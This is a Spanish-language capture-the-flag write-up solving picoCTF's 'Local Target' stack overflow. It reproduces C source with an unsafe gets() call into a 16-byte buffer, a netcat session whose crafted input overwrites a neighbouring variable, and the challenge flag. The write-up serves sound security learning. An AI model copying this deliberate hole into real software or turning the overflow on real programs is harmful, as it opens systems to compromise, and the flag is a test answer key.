## Descripción

Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/518/local-target). You can view source [here](https://artifacts.picoctf.net/c/518/local-target.c). And connect with it using: `nc saturn.picoctf.net 65341`


## Hints
+ Do anything you can to change `num`.
+ When you change `num`, view the value as hexadecimal.

## Solución

Para cambiar el valor de num, al analizar el codigo fuente nos damos cuenta que input tiene un limite de bytes, se prueba su capacidad colocando caracteres al azar, esto da como resultado que se ocupan 24 caracteres o bytes para llenar el buffer, posteriormente despues de este buffer lleno se puede cambiar el valor de la variable num el sigueinte caracter despues de llenar el buffer debe de ser el numero que se requiere, en este caso el 65 o A en sistema ascii.

``` c
#include <stdio.h>
#include <stdlib.h>

int main(){
  FILE *fptr;
  char c;

  char input[16];
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }

    // Read contents from file
    c = fgetc(fptr);
    while (c != EOF)
    {
        printf ("%c", c);
        c = fgetc(fptr);
    }
    fflush(stdout);

    printf("\n");
    fflush(stdout);
    fclose(fptr);
    exit(0);
  }
  
  printf("Bye!\n");
  fflush(stdout);
}

```

``` bash
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Examen_parcial_3/BinaryExplotation/02_Local_Target]
└──╼ $nc saturn.picoctf.net 55521
Enter a string: \x4d\x4c\x4b\x4a\x49\x48A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}
┌─[ramdark@parrot]─[~/Documents/Hacking_Notes_RFC/Examen_parcial_3/BinaryExplotation/02_Local_Target]
└──╼ $


```



## Flag
```picoCTF{l0c4l5_1n_5c0p3_7bd3fee1}```



## Notas adicionales




## Referencias
+ [Buffer overflow ](https://0xrick.github.io/binary-exploitation/bof2/)
